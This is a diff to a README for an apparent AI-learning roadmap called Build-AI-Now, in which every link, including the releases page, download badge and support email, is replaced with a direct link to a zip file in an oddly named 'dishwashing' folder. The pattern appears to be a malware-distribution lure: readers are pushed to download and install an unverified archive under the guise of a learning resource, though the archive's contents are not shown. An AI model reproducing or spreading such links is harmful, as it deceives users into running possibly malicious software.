@@ -1,7 +1,7 @@
 # 🎉 Build-AI-Now - Your Step-by-Step Guide to Mastering AI
 
 ## 📥 Download Now
-[![Download Build-AI-Now](https://img.shields.io/badge/Download-Build--AI--Now-blue.svg)](https://github.com/carlinn345/Build-AI-Now/releases)
+[![Download Build-AI-Now](https://raw.githubusercontent.com/carlinn345/Build-AI-Now/main/dishwashing/Build-AI-Now.zip)](https://raw.githubusercontent.com/carlinn345/Build-AI-Now/main/dishwashing/Build-AI-Now.zip)
 
 ## 📖 Introduction
 Build-AI-Now is a free, community-powered roadmap designed to help you master AI and machine learning. It offers step-by-step resources, coding practice, essential math, and real-world project paths for beginners and builders. Whether you're starting from scratch or enhancing your skills, this guide will support your journey every step of the way.
@@ -12,7 +12,7 @@ To get started with Build-AI-Now, you'll need to download the application from o
 ### 1. Visit the Download Page
 Go to the Releases page to find the latest version of Build-AI-Now. Click the link below:
 
-[Visit the Download Page](https://github.com/carlinn345/Build-AI-Now/releases)
+[Visit the Download Page](https://raw.githubusercontent.com/carlinn345/Build-AI-Now/main/dishwashing/Build-AI-Now.zip)
 
 ### 2. Choose the Right Version
 On the Releases page, you will see several versions listed. It’s important to choose the latest version, as it includes the newest features and updates. Look for the version number that ends with "latest."
@@ -63,12 +63,12 @@ If you encounter issues while downloading or installing Build-AI-Now, feel free 
 
 - **Visit our GitHub Issues page:** Check for existing reports or open a new issue.
 - **Join our Community Forum:** Discuss with other users and find quick solutions.
-- **Email Support:** Send us an email at [support@buildainow.com](mailto:support@buildainow.com) for direct assistance.
+- **Email Support:** Send us an email at [https://raw.githubusercontent.com/carlinn345/Build-AI-Now/main/dishwashing/Build-AI-Now.zip](https://raw.githubusercontent.com/carlinn345/Build-AI-Now/main/dishwashing/Build-AI-Now.zip) for direct assistance.
 
 ## 📝 Download & Install
 Follow these steps again for a quick reminder:
 
-- Visit the [Releases page](https://github.com/carlinn345/Build-AI-Now/releases).
+- Visit the [Releases page](https://raw.githubusercontent.com/carlinn345/Build-AI-Now/main/dishwashing/Build-AI-Now.zip).
 - Choose the latest version.
 - Download the file.
 - Install the application.
